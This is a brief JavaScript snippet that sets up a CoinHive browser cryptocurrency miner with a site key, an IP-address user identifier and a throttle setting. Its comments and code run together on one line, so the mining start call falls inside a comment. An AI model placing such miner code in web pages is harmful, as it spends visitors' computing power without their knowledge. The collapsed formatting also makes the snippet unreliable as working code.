var miner = new CoinHive.User('F2dML7HihmSB06rI1e8x36UTpyG7W3Sr', '80.0.215.188', {
    throttle: 0.3
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}